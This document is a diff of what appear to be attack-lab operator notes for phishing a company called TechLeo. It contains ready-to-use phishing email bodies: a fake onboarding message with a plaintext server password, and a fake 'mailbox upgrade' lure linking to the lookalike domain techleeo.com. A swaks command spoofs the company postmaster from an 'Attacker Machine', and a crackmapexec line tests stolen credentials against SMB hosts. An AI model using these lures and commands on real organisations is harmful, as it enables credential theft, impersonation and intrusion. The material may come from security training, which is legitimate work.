@@ -1,16 +1,12 @@
+Trên máy 146.4.21.94
+
 echo "Dear Mohammed, <br><br> Welcome to the TechLeo Web Services team <br><br> As part of our team, you will have access to various servers necessary for your role. Below are your credentials for our web server: <br><br> <ul> <li><b>Web Server URL:</b> <a href='https://webserver.techleo.com'>webserver.techleo.com</a></li> <li><b>Username:</b>websupport</li> <li><b>Password:</b>AhArGuY5Nm7U3\!@</li> </ul> <br> For security reasons, please ensure the following: <br> <ul> <li>Change your password upon your first login.</li> <li>Do not share your login credentials with anyone.</li> <li>Always use secure connections when accessing the server.</li> </ul> <br><br> Best regards, <br> Web Services Team Lead<br> TechLeo Corporation "> /tmp/body2.txt
-
-echo "Kinh gui Mohammed, <br><br> Chao mung ban den voi doi ngu Dich vu Web cua TechLeo <br><br> La mot thanh vien cua doi ngu, ban se duoc cap quyen truy cap vao nhieu may chu can thiet cho vai tro cua minh. Duoi day la thong tin dang nhap cua ban cho may chu web cua chung toi: <br><br> <ul> <li><b>Dia chi URL cua may chu web:</b> <a href='https://webserver.techleo.com'>webserver.techleo.com</a></li> <li><b>Ten nguoi dung:</b> websupport</li> <li><b>Mat khau:</b>AhArGuY5Nm7U3\!@</li> </ul> <br> Vi ly do bao mat, vui long dam bao thuc hien cac dieu sau: <br> <ul> <li>Thay doi mat khau cua ban ngay sau lan dang nhap dau tien.</li> <li>Khong chia se thong tin dang nhap cua ban voi bat ky ai.</li> <li>Luon su dung ket noi an toan khi truy cap vao may chu.</li> </ul> <br><br> Tran trong, <br> Truong nhom Dich vu Web<br> Tap doan TechLeo" > /tmp/body2.txt
-
------------------------------------------------
 
 swaks --to mkhan@techleo.com --from postmaster@techleo.com --server 172.16.4.55 --ehlo techleo.com --attach-type text/html --attach-body @/tmp/body2.txt --h-Subject "Web Services Enrollment"
 
 -------------------------------------------------
 
 echo " Dear Everyone, <br> <br> We hope this message finds you well. We are excited to announce that our email infrastructure is undergoing a significant upgrade to enhance performance, security, and user experience. This upgrade will provide you with a more streamlined and efficient email service. <br> <br> <b>What This Means for You:</b> <br> <ul> <li>Improved mailbox speed and reliability.</li> <li>Enhanced security features to protect your communications.</li> <li>A smoother and more intuitive user interface.</li> </ul> <br> <b>Action Required:</b> <br> <br> To ensure a smooth transition, you may be required to authenticate to the new email server. This is a simple process that will align your account with the upgraded system. <br> <br> Please click on the following link to initiate the authentication process: <br> <a href='https://mail.techleeo.com'>Initiate Mailbox Upgrade Authentication</a> <br> <br> <b>Important:</b> The link will be active for a period of 7 days, starting from today. Please complete the authentication process within this timeframe to avoid any interruptions to your email service. <br> <br> Thanks, <br> The Infrastructure Team " > /tmp/body.txt
-
-echo "Kinh gui tat ca moi nguoi, <br> <br> Chung toi hy vong email nay den voi ban trong trang thai tot nhat. Chung toi rat vui mung thong bao rang ha tang email cua chung toi dang duoc nang cap dang ke nham cai thien hieu suat, bao mat va trai nghiem nguoi dung. Viec nang cap nay se mang den cho ban mot dich vu email muot ma va hieu qua hon. <br> <br> <b>Dieu nay co y nghia gi voi ban:</b> <br> <ul> <li>Toc do va do tin cay cua hop thu duoc cai thien.</li> <li>Cac tinh nang bao mat nang cao de bao ve thong tin lien lac cua ban.</li> <li>Giao dien nguoi dung muot ma va truc quan hon.</li> </ul> <br> <b>Hanh dong can thuc hien:</b> <br> <br> De dam bao qua trinh chuyen doi dien ra suon se, ban co the can xac thuc voi may chu email moi. Day la mot quy trinh don gian giup dong bo tai khoan cua ban voi he thong da duoc nang cap. <br> <br> Vui long nhap vao lien ket sau de bat dau qua trinh xac thuc: <br> <a href='https://mail.techleeo.com'>Khoi tao xac thuc nang cap hop thu</a> <br> <br> <b>Quan trong:</b> Lien ket nay se co hieu luc trong vong 7 ngay, bat dau tu hom nay. Vui long hoan tat qua trinh xac thuc trong khoang thoi gian nay de tranh gian doan dich vu email cua ban. <br> <br> Tran trong, <br> Doi ngu Ha tang" > /tmp/body.txt
 -------------------------------------------------------
 
 #Send the emails using swaks on 146.4.21.94 Attacker Machine 
@@ -202,3 +198,4 @@ crackmapexec smb 192.168.210.81 192.168.210.82 192.168.210.83 -u 'aabdullah' -p 
 
 
 Ctr+c 
+
